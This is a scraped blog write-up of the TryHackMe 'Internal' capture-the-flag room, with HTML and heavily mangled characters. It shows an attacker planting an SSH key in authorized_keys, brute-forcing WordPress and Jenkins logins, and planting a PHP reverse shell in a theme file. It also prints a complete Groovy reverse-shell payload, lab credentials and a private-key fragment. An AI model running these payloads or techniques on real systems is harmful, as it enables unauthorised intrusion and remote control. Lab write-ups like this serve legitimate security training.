+bcy9rlJTMmJEGqN0frEWJT6XPqjOFkMpWXYyIyjcshwBzGE2xHKLMMPBjIj7Fi/ZLuAQAA
+AMBHnBAS+G8bHpGQzqeekCO168TcTx5DzTIDIkooDKLhboUTAxWVqMRNrjWp0C+nuB+QIu
+W+XrfGDfbWbwjS6LJ90CGC+TCtzNG6S3V7F8OgzJOmbhayQzhW/LnW7UbEkLbclKfGky5l
+2D+VpwlPy2OvQ6g5m+/zCmIKCubpicosMBkuxFh1wbHwrCgmxHAMykDgOCw1On1poyM0Fl
+Wp9JxgkVUWtLox9bXfs+H8WgRLknjF0E6ywcvCDjkB9/p6PrUAAADBAPKh9Fqr15jeu/BG
+fwJDZe/4J07aeg/LxNk9QN/JnqFp+FmN9fAi4NHTbh95YTgSZmYK8DTH5KdcUKSLtL6bcc
+M7lex3jHJKQVKPLgDV+80zMBb+S9WrIRS7/97O3n4qmIpiU9ZsF8x/WqsB3UCHOOIBi32O
+WRKPuBSCNSHT+BszLF1j5/NgHmle5vE31Mb3RZIcgSt5DsJhWd3ACRCICxVGgHH10XiPD1
+GJsxcTO8Gl2g05O2kUQA+06OY8mHqQgQAAAMEAysDYXU6a1E/LiE+X0baI7m/hHg5a+w0m
+5HYHORMeFRgdX5+RJSkwXon/5jPJ7CPGV6YZr70rd6ZFDw+ilXKwxMoP7UZIgf+cdGjlEV
+J3DTdfOqpqdrw3FptkGZaGqKBdQ6fRlyezmNQ3ch01Xr018k1aK2VvPgwFOH+j+zWacHqG
+lFXZTpGxQ+plbu/6bAPr3HWzBALB/+wImpEd6ncXgMTOwogD+ts2KmkJ6nVOCS/KRvNPZ+
+ScVP31RHFyJIWfAAAACXJvb3RAa2FsaQE~|=|
+~|-|~|-|~|-|~|-|~|-|END OPENSSH PRIVATE KEY~|-|~|-|~|-|~|-|~|-|
+root@kali:~/Desktop/importatnt~|#| ls ~|-|la
+total 16
+drwxr~|-|xr~|-|x 2 root root 4096 Feb 10 12:09 .
+drwxr~|-|xr~|-|x 4 root root 4096 Feb 10 12:09 ..
+~|-|rw~|-|~|-|~|-|~|-|~|-|~|-|~|-| 1 root root 2590 Feb 10 12:09 id_rsa
+~|-|rw~|-|r~|-|~|-|r~|-|~|-| 1 root root  563 Feb 10 12:09 id_rsa.pub
+root@kali:~/Desktop/importatnt~|#| cat id_rsa.pub 
+ssh~|-|rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAKpFX5RtdWxvLMB8TUiIbEcXbTHJFdsrad8tfGHhr6gHHytxZGzHJX7nTzYj8Fn60gvDFpzQDFU9QtalpJV7cTh18hK5ccDTJp90QIQ1LPznpjwdY05B/pWcSHRxETQAKXDqBl8/xGg6HPNCGLMRmTX6vpvG7TH9NRcoBt0Y1UyyLfXdtUNNg4glSorvebjoPnD+sP3Zyw3zhH2biMc2Vs6ytIIzo6iqHw2OjcWDEtDHOz7n+Z+GOAPBD8d5dj0Iz1XxqDw7CsYw24/cfBa9h8VDvmWf6kSBJIhlYuA4jqzxttep5o79IP6vJLQ+HVSGj7yQMBQhx9OvPPjot/b9ojVxsoCOeTLXsPB4N1JkF3ofUp0ETHEfQ+STucLkyErNM9Y/uqc5KVfqAUNDvkVJQghjFL29CQ8jd6YvOsGQFjPGyJKYelkAx9UdYCkVSHhc+Xfug2NZMg4qUhbpOLspSDnre7AB3FHuk8fJaeokRk9ArlzEOb+e1XaGNYSVWxR8~|=| root@kali
+</span></code></pre></div></div>
+<ul>
+  <li>cahnge of id_rsa.pub permission to 600</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+root@kali:~/Desktop/importatnt~|#| <span class="nb">cat </span>id_rsa.pub 
+ssh~|-|rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAKpFX5RtdWxvLMB8TUiIbEcXbTHJFdsrad8tfGHhr6gHHytxZGzHJX7nTzYj8Fn60gvDFpzQDFU9QtalpJV7cTh18hK5ccDTJp90QIQ1LPznpjwdY05B/pWcSHRxETQAKXDqBl8/xGg6HPNCGLMRmTX6vpvG7TH9NRcoBt0Y1UyyLfXdtUNNg4glSorvebjoPnD+sP3Zyw3zhH2biMc2Vs6ytIIzo6iqHw2OjcWDEtDHOz7n+Z+GOAPBD8d5dj0Iz1XxqDw7CsYw24/cfBa9h8VDvmWf6kSBJIhlYuA4jqzxttep5o79IP6vJLQ+HVSGj7yQMBQhx9OvPPjot/b9ojVxsoCOeTLXsPB4N1JkF3ofUp0ETHEfQ+STucLkyErNM9Y/uqc5KVfqAUNDvkVJQghjFL29CQ8jd6YvOsGQFjPGyJKYelkAx9UdYCkVSHhc+Xfug2NZMg4qUhbpOLspSDnre7AB3FHuk8fJaeokRk9ArlzEOb+e1XaGNYSVWxR8~|<span class="o">=</span>| root@kali
+
+</code></pre></div></div>
+
+<p>on aubreanna machine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+aubreanna@internal:~<span class="nv">$ </span><span class="nb">cd</span> .ssh
+<span class="nb">cd</span> .ssh
+aubreanna@internal:~/.ssh<span class="nv">$ </span><span class="nb">ls</span> ~|-|la
+<span class="nb">ls</span> ~|-|la
+total 8
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Aug  3  2020 <span class="nb">.</span>
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 7 aubreanna aubreanna 4096 Aug  3  2020 ..
+aubreanna@internal:~/.ssh<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"ssh~|-|rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAKpFX5RtdWxvLMB8TUiIbEcXbTHJFdsrad8tfGHhr6gHHytxZGzHJX7nTzYj8Fn60gvDFpzQDFU9QtalpJV7cTh18hK5ccDTJp90QIQ1LPznpjwdY05B/pWcSHRxETQAKXDqBl8/xGg6HPNCGLMRmTX6vpvG7TH9NRcoBt0Y1UyyLfXdtUNNg4glSorvebjoPnD+sP3Zyw3zhH2biMc2Vs6ytIIzo6iqHw2OjcWDEtDHOz7n+Z+GOAPBD8d5dj0Iz1XxqDw7CsYw24/cfBa9h8VDvmWf6kSBJIhlYuA4jqzxttep5o79IP6vJLQ+HVSGj7yQMBQhx9OvPPjot/b9ojVxsoCOeTLXsPB4N1JkF3ofUp0ETHEfQ+STucLkyErNM9Y/uqc5KVfqAUNDvkVJQghjFL29CQ8jd6YvOsGQFjPGyJKYelkAx9UdYCkVSHhc+Xfug2NZMg4qUhbpOLspSDnre7AB3FHuk8fJaeokRk9ArlzEOb+e1XaGNYSVWxR8~|=| root@kali"</span> <span class="o">&gt;&gt;</span> authorized_keys
+~|&lt;|rlzEOb+e1XaGNYSVWxR8~|<span class="o">=</span>| root@kali<span class="s2">" &gt;&gt; authorized_keys
+aubreanna@internal:~/.ssh</span><span class="nv">$ </span><span class="s2">ls ~|-|la
+ls ~|-|la
+total 12
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 2 aubreanna aubreanna 4096 Feb 10 12:10 .
+drwx~|-|~|-|~|-|~|-|~|-|~|-| 7 aubreanna aubreanna 4096 Aug  3  2020 ..
+~|-|rw~|-|rw~|-|r~|-|~|-| 1 aubreanna aubreanna  563 Feb 10 12:10 authorized_keys
+aubreanna@internal:~/.ssh</span><span class="nv">$ </span><span class="s2">
+
+</span></code></pre></div></div>
+
+<p>connect and port forwarding</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+root@kali:~/Desktop/importatnt~|#| <span class="nb">chmod </span>600 id_rsa.pub
+root@kali:~/Desktop/importatnt~|#| ssh ~|-|i id_rsa ~|-|L 8080:127.0.0.1:8080 aubreanna@internal.htb
+ssh: Could not resolve <span class="nb">hostname </span>internal.htb: Name or service not known
+root@kali:~/Desktop/importatnt~|#| <span class="nb">cat</span> /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.93.161 internal.thm
+~|#| The following lines are desirable <span class="k">for </span>IPv6 capable hosts
+::1     localhost ip6~|-|localhost ip6~|-|loopback
+ff02::1 ip6~|-|allnodes
+ff02::2 ip6~|-|allrouters
+root@kali:~/Desktop/importatnt~|#| ssh ~|-|i id_rsa ~|-|L 8080:127.0.0.1:8080 aubreanna@internal.thm
+The authenticity of host <span class="s1">'internal.thm (10.10.93.161)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>internal.thm,10.10.93.161<span class="s1">' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0~|-|112~|-|generic x86_64)
+ 
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+ 
+  System information as of Thu Feb 10 12:12:55 UTC 2022
+ 
+  System load:  0.08              Processes:              116
+  Usage of /:   64.9% of 8.79GB   Users logged in:        0
+  Memory usage: 39%               IP address for eth0:    10.10.93.161
+  Swap usage:   0%                IP address for docker0: 172.17.0.1
+ 
+  ~|=|&gt; There is 1 zombie process.
+ 
+ 
+ * Canonical Livepatch is available for installation.
+   ~|-| Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+ 
+0 packages can be updated.
+0 updates are security updates.
+
+</span></code></pre></div></div>
+<h2 id="enumerat-jenkins">enumerat Jenkins</h2>
+
+<p>At first cahnge BurpSuite port</p>
+
+<p><img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/posts/tryhackme/internal/burp-cert.png" alt="" /></p>
+
+<p>try to log in as we do berfore an intercept login request and brute foce the password.</p>
+
+<blockquote>
+  <p>admin:spongebob</p>
+</blockquote>
+
+<h3 id="revese-shell-in-jenkins">Revese shell in jenkins</h3>
+
+<p>i find this <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins" title="article">article</a> and this how to excute our code to get a revese shell 
+<a href="https://medium.com/m/global-identity?redirectUrl=https%3A%2F%2Fblog.pentesteracademy.com%2Fabusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6" title="article 2">article 2</a></p>
+
+<p>Jenkins supports groovy script execution. i found this article</p>
+
+<p><a href="https://www.devopsschool.com/blog/how-to-run-execute-groovy-script-in-jenkins/" title="execute groovy script in Jenkins">execute groovy script in Jenkins</a></p>
+
+<ul>
+  <li>now go to Nodes</li>
+  <li>master</li>
+  <li>Script Console</li>
+</ul>
+
+<p>Now i need to get creat my reverse shell. i found <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76" title="revsh.groovy">revsh.groovy</a>.</p>
+
+<h3 id="excute-our-payload-to-get-reverse-shell-on-nc-">Excute our payload to get reverse shell on nc</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String host~|=|"localhost";
+int port~|=|8044;
+String cmd~|=|"cmd.exe";
+Process p~|=|new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s~|=|new Socket(host,port);InputStream pi~|=|p.getInputStream(),pe~|=|p.getErrorStream(), si~|=|s.getInputStream();OutputStream po~|=|p.getOutputStream(),so~|=|s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+</code></pre></div></div>
+
+<p>we get our reverse shell and as in aubreanna go to /opt directory to seach for and intersting files</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /opt
+ls
+note.txt
+cat node.txt
+cat: node.txt: No such file or directory
+cat note.txt
+Aubreanna,
+ 
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+ 
+root:tr0ub13guM!@~|#|123
+</code></pre></div></div>
+
+<h2 id="read-root-flag">Read Root flag</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aubreanna@internal:/var/backups$ su root
+Password: 
+root@internal:/var/backups~|#| cd /root/
+root@internal:~~|#| ll
+total 48
+drwx~|-|~|-|~|-|~|-|~|-|~|-|  7 root root 4096 Aug  3 13:16 ./
+drwxr~|-|xr~|-|x 24 root root 4096 Aug  3 01:31 ../
+~|-|rw~|-|~|-|~|-|~|-|~|-|~|-|~|-|  1 root root  193 Aug  3 20:01 .bash_history
+~|-|rw~|-|r~|-|~|-|r~|-|~|-|  1 root root 3106 Apr  9  2018 .bashrc
+drwx~|-|~|-|~|-|~|-|~|-|~|-|  2 root root 4096 Aug  3 02:23 .cache/
+drwx~|-|~|-|~|-|~|-|~|-|~|-|  3 root root 4096 Aug  3 02:23 .gnupg/
+drwxr~|-|xr~|-|x  3 root root 4096 Aug  3 01:53 .local/
+~|-|rw~|-|~|-|~|-|~|-|~|-|~|-|~|-|  1 root root 1071 Aug  3 13:16 .mysql_history
+~|-|rw~|-|r~|-|~|-|r~|-|~|-|  1 root root  148 Aug 17  2015 .profile
+drwx~|-|~|-|~|-|~|-|~|-|~|-|  2 root root 4096 Aug  3 01:40 .ssh/
+~|-|rw~|-|r~|-|~|-|r~|-|~|-|  1 root root   22 Aug  3 04:13 root.txt
+drwxr~|-|xr~|-|x  3 root root 4096 Aug  3 01:41 snap/
+root@internal:~~|#| cat root.txt 
+THM{D0n'T_C0Py~|-|AnD~|-|PaSt}
+</code></pre></div></div>
+<p>Give My Your Feedback.</p>
+
+<p><img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/tryhackme.gif" alt="" /></p>
+
+
+
+                <!-- Pagination links -->
+
+
+            </article>
+
+            
+                <aside class="see-also">
+                    <h2>See also</h2>
+                    <ul>
+                        
+                        
+                        
+                            <li>
+                                <a href="//CVE2023~47261/">
+                                    
+                                        <img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/posts/CVE/DCM.png">
+                                    
+                                    <h3>CVE-2023-47261</h3>
+                                </a>
+                            </li>
+                        
+                            <li>
+                                <a href="//PortSwigger-OS-command-injection-Labs-&-Notes-Writeup/">
+                                    
+                                        <img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/95eae24777b2a914837b0fe2d178f4eb7ed623a8/assets/img/posts/misc/os-command-injection.svg">
+                                    
+                                    <h3>OS command injection</h3>
+                                </a>
+                            </li>
+                        
+                            <li>
+                                <a href="//PortSwigger-Cross-origin-resource-sharing-Labs-&-Notes-Writeup/">
+                                    
+                                        <img src="https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/51fc5214b5722d7c0ce1944275b7a1042c628554/assets/img/posts/CORS/attack-on-cors.svg">
+                                    
+                                    <h3>Cross-origin resource sharing Vulnerabilities</h3>
+                                </a>
+                            </li>
+                        
+                    </ul>
+                </aside>
+            
+
+        </section>
+
+        <!-- Add time bar only for pages without pagination -->
+        
+            <div class="time-bar" data-minutes="15">
+    <span class="time-completed"></span>
+    <span class="time-remaining"></span>
+    <div class="bar">
+        <span class="completed" style="width:0%;"></span>
+        <span class="remaining" style="width:100%;"></span>
+    </div>
+</div>
+
+            <div class="recommendation">
+    <div class="message">
+        <strong>Why don't you read something next?</strong>
+        <div>
+            <button>
+                <svg><use xlink:href="#icon-arrow-right"></use></svg>
+                <span>Go back to top</span>
+            </button>
+        </div>
+    </div>
+    
+    <a href="//Devzat/" class="post-preview">
+        <div class="image">
+            
+                <img src="https://www.hackthebox.com/storage/avatars/43a4b7b2ba6e11c48b128aa46cddaf49.png">
+            
+        </div>
+        <h3 class="title">Devzat</h3>
+    </a>
+</div>
+
+        
+
+        <!-- Show modal if the post is the last one -->
+        
+
+        <!-- Show modal before user leaves the page -->
+        
+
+        <!-- Add your newsletter subscription form here -->
+
+        <section class="share">
+    <h3>Share</h3>
+    <a aria-label="Share on Twitter" href="https://twitter.com/intent/tweet?text=&quot;in this blog i've explained how to root Internal from TryHackMe&quot;%20https://h3x0s3.github.io/Internal/%20via%20&#64;H3X0S3&hashtags=tryhackme,CTF,WPsacn,Jenkins,groovy,Lateral movement,Port Forwarding,Reverse shell"
+    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
+        <svg class="icon icon-twitter"><use xlink:href="#icon-twitter"></use></svg>
+    </a>
+    <a aria-label="Share on Facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://h3x0s3.github.io/Internal/"
+    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
+        <svg class="icon icon-facebook"><use xlink:href="#icon-facebook"></use></svg>
+    </a>
+</section>
+
+        
+
+
+        
+
+<section class="comments">
+    <h3>Comments</h3>
+    <div id="disqus_thread"></div>
+</section>
+<script type="text/javascript">
+    var disqus_loaded = false;
+
+    function load_disqus()
+    {
+        disqus_loaded = true;
+        var disqus_shortname = 'H3X0S3';
+        var disqus_title = '';
+        var disqus_url = '/Internal/';
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        var ldr = document.getElementById('disqus_loader');
+    };
+    window.onscroll = function(e) {
+        if ((window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 800)) {
+            //hit bottom of page
+            if (disqus_loaded==false)
+                load_disqus()
+        }
+    };
+</script>
+
+
+
+        <footer>
+    <p>
+      
+        <a href="https://github.com/H3X0S3" title="Github">
+          <svg><use xlink:href="#icon-github"></use></svg>
+        </a>
+      
+      
+        <a href="https://www.facebook.com/doctor.H3X0S3" title="Facebook">
+          <svg><use xlink:href="#icon-facebook"></use></svg>
+        </a>
+      
+      
+        <a href="https://twitter.com/H3X0S3" title="Twitter">
+          <svg><use xlink:href="#icon-twitter"></use></svg>
+        </a>
+      
+      
+      
+      
+        <a href="https://www.linkedin.com/in/H3X0S3" title="LinkedIn">
+          <svg><use xlink:href="#icon-linkedin"></use></svg>
+        </a>
+      
+    </p>
+
+    <ul>
+  
+    
+      <li>
+        <a href="https://h3x0s3.github.io//">Home</a>
+      </li>
+    
+  
+    
+      <li>
+        <a href="https://h3x0s3.github.io//about">About</a>
+      </li>
+    
+  
+    
+      <li>
+        <a href="https://h3x0s3.github.io//contact">Contact</a>
+      </li>
+    
+  
+    
+      <li>
+        <a href="https://h3x0s3.github.io//feed.xml">Feed</a>
+      </li>
+    
+  
+</ul>
+
+</footer>
+
+
+
+
+
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "H3X0S3",
+  "description": "an information security blog which contains a blogs related to hackthebox, tryhackme,web application security. Mahmoud Salah.",
+  "url": "https://h3x0s3.github.io//",
+  "logo": {
+      "@type": "ImageObject",
+      "url": "https://h3x0s3.github.io//assets/img/icons/mediumtile.png",
+      "width": "600",
+      "height": "315"
+  },
+  "sameAs": [
+    "https://github.com/H3X0S3","https://www.facebook.com/doctor.H3X0S3","https://twitter.com/H3X0S3","https://www.linkedin.com/in/H3X0S3"
+  ]
+}
+</script>
+
+<!-- Include the script that allows Netlify CMS login -->
+<script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script>
+
+<!-- Include the website scripts -->
+<script src="//assets/js/scripts.min.js"></script>
+
+<!-- Include Google Analytics script -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXXXXXXX-X"></script>
+<script>
+  var host = window.location.hostname;
+  if (host != 'localhost') {
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-XXXXXXXX-X');
+  }
+</script>
+  
+
+
+
+        
+
+        
+        
+        
+        
+        
+        
+        
+        
+        <script type="application/ld+json">
+        {
+            "@context": "http://schema.org",
+            "@type": "BlogPosting",
+            "name": "Internal",
+            "headline": "Internal for TyHackMe Writeup.",
+            "description": "in this blog i've explained how to root Internal from TryHackMe",
+            "image": "https://tryhackme-images.s3.amazonaws.com/room-icons/222b3e855f88a482c1267748f76f90e0.jpeg",
+            "url": "https://h3x0s3.github.io//Internal/",
+            "articleBody": "Pre-engagement Briefing
+
+
+You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks.
+
+Scope of Work
+
+The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
+
+
+  User.txt
+  Root.txt
+
+
+Additionally, the client has provided the following scope allowances:
+
+
+  Ensure that you modify your hosts file to reflect internal.thm
+  Any tools or techniques are permitted in this engagement
+  Locate and note all vulnerabilities found
+  Submit the flags discovered to the dashboard
+  Only the IP address assigned to your machine is in scope
+
+
+(Roleplay off)
+
+
+
+Enumeration
+
+
+  nmap -sC -A 10.10.132.80
+
+
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh~|-|hostkey: 
+|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
+|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
+|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http~|-|server~|-|header: Apache/2.4.29 (Ubuntu)
+|_http~|-|title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+we have two open ports
+
+
+  22/tcp open  ssh
+  
+    80/tcp open  http
+we will enumerat web as we have 80/tcp open  http
+  
+  Add 10.10.132.80 to /etc/hosts as internal.thm
+
+
+
+root@kali:~~|#| dirb http://10.10.93.161/ ~|-|w /usr/share/wordlists/dirb/common.txt
+ 
+~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|
+DIRB v2.22    
+By The Dark Raver
+~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|
+ 
+START_TIME: Thu Feb 10 11:27:33 2022
+URL_BASE: http://10.10.93.161/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+OPTION: Not Stopping on warning messages
+ 
+~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|
+ 
+GENERATED WORDS: 4612                                                          
+ 
+~|-|~|-|~|-|~|-| Scanning URL: http://10.10.93.161/ ~|-|~|-|~|-|~|-|
+~|=|~|=|&amp;gt; DIRECTORY: http://10.10.93.161/blog/                                                                      
++ http://10.10.93.161/index.html (CODE:200|SIZE:10918)                                                        
+~|=|~|=|&amp;gt; DIRECTORY: http://10.10.93.161/javascript/                                                                
+~|=|~|=|&amp;gt; DIRECTORY: http://10.10.93.161/phpmyadmin/                                                                
++ http://10.10.93.161/server~|-|status (CODE:403|SIZE:277)                                                       
+~|=|~|=|&amp;gt; DIRECTORY: http://10.10.93.161/wordpress/                                                                                                                                           ss/images/zt                   
+~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|~|-|
+END_TIME: Thu Feb 10 11:34:57 2022
+DOWNLOADED: 677964 ~|-| FOUND: 36
+root@kali:~~|#|
+
+we have two interesting endpoints
+
+
+  /wordpress
+
+
+
+  /blog
+
+
+
+
+Enumeration Wordpress
+
+Browsing /blog  this is a Wordpress blog,So let’s enumerate it with wpscan.
+
+root@kali:~~|#| wpscan ~|-|~|-|url http://internal.thm/blog ~|-|e u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+ 
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.6
+ 
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+ 
+[i] Updating the Database ...
+[i] Update completed.
+ 
+[+] URL: http://internal.thm/blog/ [10.10.93.161]
+[+] Started: Thu Feb 10 11:31:07 2022
+ 
+Interesting Finding(s):
+ 
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+ 
+[+] XML~|-|RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  ~|-| http://codex.wordpress.org/XML~|-|RPC_Pingback_API
+ |  ~|-| https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  ~|-| https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  ~|-| https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  ~|-| https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+ 
+[+] WordPress readme found: http://internal.thm/blog/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ 
+[+] The external WP~|-|Cron seems to be enabled: http://internal.thm/blog/wp~|-|cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  ~|-| https://www.iplocation.net/defend~|-|wordpress~|-|from~|-|ddos
+ |  ~|-| https://github.com/wpscanteam/wpscan/issues/1299
+ 
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020~|-|06~|-|10).
+ | Found By: Rss Generator (Passive Detection)
+ |  ~|-| http://internal.thm/blog/index.php/feed/, ~|&amp;lt;|generator&amp;gt;https://wordpress.org/?v~|=|5.4.2~|&amp;lt;|/generator&amp;gt;
+ |  ~|-| http://internal.thm/blog/index.php/comments/feed/, ~|&amp;lt;|generator&amp;gt;https://wordpress.org/?v~|=|5.4.2~|&amp;lt;|/generator&amp;gt;
+ 
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://internal.thm/blog/wp~|-|content/themes/twentyseventeen/
+ | Last Updated: 2022~|-|01~|-|25T00:00:00.000Z
+ | Readme: http://internal.thm/blog/wp~|-|content/themes/twentyseventeen/readme.txt
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://internal.thm/blog/wp~|-|content/themes/twentyseventeen/style.css?ver~|=|20190507
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  ~|-| http://internal.thm/blog/wp~|-|content/themes/twentyseventeen/style.css?ver~|=|20190507, Match: &apos;Version: 2.3&apos;
+ 
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs ~|-| Time: 00:00:00 ~|&amp;lt;|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|~|=|&amp;gt; (10 / 10) 100.00% Time: 00:00:00
+ 
+[i] User(s) Identified:
+ 
+[+] admin
+ | Found By: Author Posts ~|-| Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   ~|-| http://internal.thm/blog/index.php/wp~|-|json/wp/v2/users/?per_page~|=|100&amp;amp;page~|=|1
+ |  Author Id Brute Forcing ~|-| Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+ 
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+ 
+
+ 
+root@kali:~~|#|
+
+
+we have interesting output
+
+-admin Author Posts
+
+so we have a user name as admin
+
+try to login with it as default credentials
+
+
+
+press This email is correct
+
+
+
+the default credentials is wrong, now we have the request of the login so try to brute force the password of admin.
+
+
+kali@kali:/data/The_Blob_Blog/files$ wpscan ~|-|~|-|url http://internal.thm/blog ~|-|U admin ~|-|P /usr/share/wordlists/rockyou.txt 
+
+[REDACTED]
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: my2boys
+
+[REDACTED]
+
+Credentials and user falg
+
+now we have the credentials
+
+
+  admin:my2boys
+
+
+try to login at  Login and enumerate to get a reverse shell
+
+after enumeration i found a php code in some pages
+
+
+
+i will go to 404.php as it is easy to open it and excute my PHP reverse shell so  replace the PHP code with our PHP reverse shell
+
+modify the shell to connect to my nc
+
+
+
+run nc to recive connection after opening 404.php
+
+
+
+spwan shell
+
+$ python ~|-|c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;
+www~|-|data@internal:/$ whoami
+whoami
+www~|-|data
+
+get my fisrt shell and we can read the user flag
+
+
+
+Lateral movement from www-data to aubreanna
+
